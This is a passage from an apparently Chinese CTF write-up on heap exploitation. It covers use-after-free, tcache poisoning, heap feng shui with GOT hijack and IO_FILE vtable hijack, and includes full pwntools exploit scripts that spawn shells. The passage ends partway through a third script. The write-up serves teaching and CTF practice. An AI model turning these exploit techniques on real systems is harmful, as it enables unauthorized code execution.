<h3 id="五、堆重叠（overlapping）"><a href="#五、堆重叠（overlapping）" class="headerlink" title="五、堆重叠（overlapping）"></a>五、堆重叠（overlapping）</h3><h5 id="例题：-CTF2021-babyheap-Use-After-Free-tcache-poisoning"><a href="#例题：-CTF2021-babyheap-Use-After-Free-tcache-poisoning" class="headerlink" title="例题：*CTF2021 - babyheap - Use After Free + tcache poisoning"></a>例题：*CTF2021 - babyheap - Use After Free + tcache poisoning</h5><blockquote>
<p> 比较白给的签到题</p>
</blockquote>
<p><a href="/download/starCTF2021/pwn/babyheap.zip" title="点击此处下载原题">点击下载-babyheap.zip</a></p>
<p>惯例的checksec，保护全开（<del>基本上大比赛题目都是默认保护全开的</del></p>
<p><img src="https://i.loli.net/2021/01/20/dNUGu8zEfwtoyn1.png" alt="AXQ_ZFH21P_~~AUA84UQH7H.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/01/20/Y5btDgrNvsm8j1T.png" alt="V6__6F0BSJGIF__91WSD_CY.png"></p>
<p><del>一  览  无  余</del>（<del>不像后面那个符号表扣光的C++ pwn babygame人都给看傻了</del></p>
<p>程序本身有着<strong>分配、删除、修改、打印堆块内容</strong>的功能，<del>给的面面俱到，十分白给</del></p>
<p>漏洞点在于<code>delete()</code>函数中free后没有将指针置NULL，<strong>存在 Use After Free漏洞</strong></p>
<p><img src="https://i.loli.net/2021/01/20/ZEwbcnI3X7J2Y8R.png" alt=""></p>
<p>在<code>add()</code>函数中我们有着16个可用的下标，且分配时会直接覆写原指针，因此我们几乎是可以分配任意个chunk，但是<strong>只允许我们分配fastbin size范围的chunk</strong></p>
<p><img src="https://i.loli.net/2021/01/20/UEeKDiZ3hlbXBn9.png" alt="UAB1IY_NM_5GP_K2Y_4TL4V.png"></p>
<p>因此若想要泄露libc地址我们需要借助<code>malloc_consolidate()</code>将chunk送入small bins中</p>
<p>注意到<code>leaveYourName()</code>函数中会调用malloc()分配一个大chunk，因此我们可以通过调用该函数触发<code>malloc_consolidate()</code>，将fastbin中chunk送入smallbin， 以泄露libc基址</p>
<p><img src="https://i.loli.net/2021/01/20/rH6nglJkI9Ne4WO.png" alt="~D9_XAV_4G5_FGKSMTED_13.png"></p>
<p>gdb调试我们可以得知该地址与main_arena间距336，因而我们便可以得到libc基址</p>
<p><img src="https://i.loli.net/2021/01/20/CfJBNzhRyul5jAm.png" alt=""></p>
<p><strong>将这个small bin再分配回来我们就能够实现chunk overlapping了，继而就是通过程序的edit功能实现tcache poisoning修改__free_hook为system()后free一个内容为”/bin/sh”的chunk即可get shell</strong></p>
<p>需要注意的是<code>edit()</code>函数中是<strong>从bk的位置开始输入</strong>的，因而我们的fake chunk需要构造到<code>__free_hook - 8</code>的位置</p>
<p><img src="https://i.loli.net/2021/01/20/uBnYrSZptINMikh.png" alt="image.png"></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>) <span class="comment"># p = remote('52.152.231.198', 8081)</span></span><br><span class="line">e = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/usr/lib/x86_64-linux-gnu/libc.so.6'</span>) <span class="comment"># libc = ELF('./libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index:int, size:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"input index"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"input size"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"input index"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"input index"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"input content"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"input index"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaveYourName</span><span class="params">(content)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"your name:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># chunk 15 to prevent consolidate forward, so that we can get a smallbin chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># malloc_consolidate() to get a smallbin chunk, leak libc addr</span></span><br><span class="line">    leaveYourName(<span class="string">b'arttnba3'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">336</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.info(<span class="string">"Libc addr:"</span> + str(hex(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#tcache poisoning</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(libc_base + libc.sym[<span class="string">'__free_hook'</span>] - <span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite __free_hook</span></span><br><span class="line">    new(<span class="number">10</span>, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">9</span>, <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">9</span>, p64(libc_base + libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + <span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2021/01/20/NFqcz781vACTKPB.png" alt=""></p>
<h3 id="六、堆风水"><a href="#六、堆风水" class="headerlink" title="六、堆风水"></a>六、堆风水</h3><h5 id="例题：babyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><a href="#例题：babyfengshui-33c3-2016-heap-arrangement-got-table-hijack" class="headerlink" title="例题：babyfengshui_33c3_2016 - heap arrangement + got table hijack"></a>例题：babyfengshui_33c3_2016 - heap arrangement + got table hijack</h5><p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" alt="image.png"></p>
<p>我们不难看出分配堆块时所生成的大致结构应当如下，且<strong>该结构体malloc的大小为0x80，处在unsorted bin 范围内</strong></p>
<p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" alt="image.png"></p>
<p>漏洞点在于对输入长度的检测，它是检测的是<strong>我们所输入的长度是否大于从description chunk的addr到struct chunk的prev_size的长度</strong></p>
<p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" alt="image.png"></p>
<p>在常规情况下我们似乎只能够覆写掉PREV_SIZE的一部分，不痛不痒</p>
<p>但是考虑这样的一种情况：我们先分配两个大块（chunk<em>4，其中第一个块的size要在unsorted范围内），之后释放掉第一个大块，再分配一个size更大的块，unsorted bin内就会从这个大chunk（由两个chunk合并而来）中切割一个大chunk给到description，之后再从下方的top chunk切割0x90来给到struct，这个时候*</em>由于对length的错误判定就会导致我们有机会覆写第二个大块中的内容**</p>
<p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" alt="image.png"></p>
<p>故考虑先覆写第二个大块中的description addr为free@got后泄漏出libc的基址，后再修改free@got为system函数地址后释放一个内容为<code>&quot;/bin/sh&quot;</code>的chunk即可通过<code>system(&quot;/bin/sh&quot;)</code>来get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./babyfengshui_33c3_2016'</span>) <span class="comment"># remote('node3.buuoj.cn',26486)</span></span><br><span class="line">e = ELF(<span class="string">'./babyfengshui_33c3_2016'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Action: "</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, name, length:int, descryption)</span>:</span></span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size of description: "</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"name: "</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b"text length: "</span>)</span><br><span class="line">    p.sendline(str(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text: "</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, length:int, descryption)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text length: "</span>)</span><br><span class="line">    p.sendline(str(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text: "</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    big_size = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span></span><br><span class="line">    padding_length = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">    new(big_size, <span class="string">"arttnba3"</span>, padding_length + <span class="number">4</span>, <span class="string">b'A'</span> * padding_length + p32(e.got[<span class="string">'free'</span>])) <span class="comment"># idx 3</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b"description: "</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, p32(libc_base + libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" alt="image.png"></p>
<h3 id="七、IO-FILE"><a href="#七、IO-FILE" class="headerlink" title="七、IO_FILE"></a>七、IO_FILE</h3><h4 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable hijack"></a>vtable hijack</h4><h5 id="例题：-V-amp-N2020-公开赛-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><a href="#例题：-V-amp-N2020-公开赛-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget" class="headerlink" title="例题：[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget"></a>例题：[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</h5><blockquote>
<p>不愧是VN的题…又让笔者这个蒟蒻pwner学到了一种新的攻击手法…</p>
</blockquote>
<p>惯例的<code>checksec</code>，保护全开，不出意外又是一道堆题<del>看名字也知道是一道堆题</del></p>
<p><img src="https://i.loli.net/2021/01/25/3ApsgBYDW1kPvZq.png" alt=""></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/01/25/VvSMXr1gkjswG8F.png" alt=""></p>
<p>程序本身有着<strong>分配、编辑、打印、释放</strong>堆块的功能，算是功能比较齐全</p>
<p>但是程序本身限制了<strong>只能分配7次堆块，只能释放3次堆块</strong></p>
<p><img src="https://i.loli.net/2021/01/25/bh3nFx1AWiQLIpy.png" alt=""></p>
<p>漏洞点在于free功能中<strong>没有将堆块指针置NULL，存在Use After Free漏洞</strong></p>
<p><img src="https://i.loli.net/2021/01/25/qnHTGlJfv78uzCU.png" alt=""></p>
<p>虽然说在分配堆块的功能中并没有过于限制大小（0x100），但是题目所给的libc是有着tcache的2.27版本，需要通过unsorted bin泄露main_arena的地址我们至少需要释放8次堆块才能获得一个unsorted chunk，而我们仅被允许释放3次堆块</p>
<p>但是利用use after free我们是可以泄露堆基址的，而<strong>用以管理tcache的tcache_perthread_struct结构体本身便是由一个chunk实现的</strong></p>
<blockquote>
<p>以下代码来自glibc2.27</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">mstate ar_ptr;</span><br><span class="line"><span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">   victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>我们不难看出tcache结构本身便是通过一个chunk来实现的</p>
</blockquote>
<p>libc2.27中没有对tcache double free的检查，故在这里我们可以<strong>通过tcache double free结合use after free泄漏出堆基址后伪造一个位于tcache_perthread_struct结构体附近的fake chunk以劫持tcache_perthread_struct结构体修改tcache_perthread_struct-&gt;counts中对应index的值为7后释放chunk便可以获得unsorted bin以泄露libc基址</strong></p>
<p>惯例的pwndbg动态调试，我们可以得到tcache结构体的size，也就得到了偏移</p>
<p><img src="https://i.loli.net/2021/01/25/ceBImgTw97HbUxh.png" alt=""></p>
<blockquote>
<p>libc2.31下这个size为0x291，不要像我一样犯了调错libc的错误❌</p>
</blockquote>
<p>需要注意的是在free功能中会将其保存的chunk size置0， 因而我们需要<strong>重新将这个chunk申请回来后才能继续编辑</strong></p>
<blockquote>
<p>菜鸡a3の踩坑点 * 1</p>
</blockquote>
<p>这道题最经典的做法就是套板子，劫持__malloc_hook为one_gadget以get shell</p>
<p>但是除了劫持__malloc_hook为one_gadget之外，我们也可以通过劫持_IO_2_1_stdout_中的vtable表的方式调用one_gadget</p>
<p>观察到程序中在我们edit之后会调用puts()函数</p>
<p><img src="https://i.loli.net/2021/01/28/NlbrxUYMTpaohFj.png" alt=""></p>
<p>puts()函数定义于libio/ioputs.c中，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">weak_alias (_IO_puts, <span class="built_in">puts</span>)</span><br><span class="line">libc_hidden_def (_IO_puts)</span><br></pre></td></tr></table></figure>

<p>观察到其会使用宏<code>_IO_sputn</code>，该宏定义于libio/libioP.c中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>套娃宏，跟进：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_JUMPS_OFFSET 0</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br></pre></td></tr></table></figure>

<p>即<strong>puts函数最终会调用vtable表中的</strong><code>__xsputn</code><strong>函数指针</strong>，gdb调试我们可以知道其相对表头偏移应当为<code>0x30</code>（64位下）</p>
<p><img src="https://i.loli.net/2021/01/28/nDQR7vLuyY92sK6.png" alt=""></p>
<p>由于<strong>自libc2.24始增加了对vtable表的合法性检测，故我们只能执行位于合法vtable表范围内的函数指针</strong></p>
<p>考虑到<strong>_IO_str_finish函数会将FILE指针 + 0xE8的位置作为一个函数指针执行</strong>，故我们选择修改_IO_2_1_stdout_的vtable表至特定位置以<strong>调用_IO_str_finish函数</strong></p>
<p>表_IO_str_jumps中存在着我们想要利用的_IO_str_finish函数的指针，且该表是一个合法vtable表，故只要我们<strong>将stdout的vtable表劫持到_IO_str_finish附近即可成功调用_IO_str_finish函数</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8za9eybLr15CQdn.png" alt=""></p>
<p>由_IO_jump_t结构体的结构我们不难计算出fake vtable的位置应当为<strong>_IO_str_jumps - 0x28</strong></p>
<p>劫持vtable表后在_IO_2_1_stdout_ + 0xE8的位置放上one_gadget，即可在程序调用puts函数时get shell</p>
<p>通过gdb调试可以帮助我们更好地构造fake _IO_2_1_stdout_结构体</p>
<p><img src="https://i.loli.net/2021/01/28/1UL7f9tYpJvDQun.png" alt=""></p>
<p><img src="https://i.loli.net/2021/01/28/jJmV5HoTubeZGc9.png" alt=""></p>
<p>需要注意的一点是有少部分符号无法直接通过sym字典获得，我们在这里采用其相对偏移以计算其真实地址，详见注释</p>
<p><img src="https://i.loli.net/2021/01/28/2VYftpBeUyLrFa6.png" alt=""></p>
<p>故最后构造的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 